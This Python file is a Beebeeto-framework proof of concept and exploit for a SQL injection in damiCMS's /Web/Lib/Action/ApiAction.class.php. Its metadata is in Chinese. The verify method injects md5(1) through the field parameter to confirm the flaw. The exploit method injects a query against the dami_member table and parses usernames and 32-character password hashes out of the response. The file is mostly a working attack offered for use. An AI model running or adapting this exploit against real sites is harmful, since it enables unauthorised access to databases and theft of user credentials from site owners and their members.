#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import requests

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0116',
            'name': '大米CMS /Web/Lib/Action/ApiAction.class.php SQL注入漏洞 POC & Exploit',
            'author': 'xyw55',
            'create_date': '2015-06-28',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'damiCMS',
            'vul_version': ['*'],
            'type': 'SQL Injection',
            'tag': ['damiCMS漏洞', 'ApiAction.class.php漏洞', 'php'],
            'desc': '''
                    damiCMS SQL注入漏洞，漏洞位于/Web/Lib/Action/ApiAction.class.php，
                    过滤不严导致漏洞。
                    ''',
            'references': ['http://www.wooyun.org/bugs/wooyun-2010-097671'],
        },
    }

    @classmethod
    def verify(cls, args):
        url = args['options']['target']
        payload = '''s=/api/ajax_arclist/model/article/field/md5(1)%23'''
        verify_url = ('%s/index.php?%s') % (url, payload)
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        req = requests.get(verify_url)
        if req.status_code == 200 and 'ca4238a0b923820dcc509a6f75849' in req.content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
        return args


    @classmethod
    def exploit(cls, args):
        url = args['options']['target']
        payload = '''s=/api/ajax_arclist/model/article/field/username,userpwd%20from%20dami_member%23'''
        verify_url = ('%s/index.php?%s') % (url, payload)
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        req = requests.get(verify_url)
        if req.status_code == 200:
            pattern = r'username":"(.*?)","userpwd":"(.{32})"}'
            m = re.findall(pattern, req.content)
            if m:
                args['success'] = True
                args['poc_ret']['user'] = []
                for x in m:
                    args['poc_ret']['user'].append(x)
        return args


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())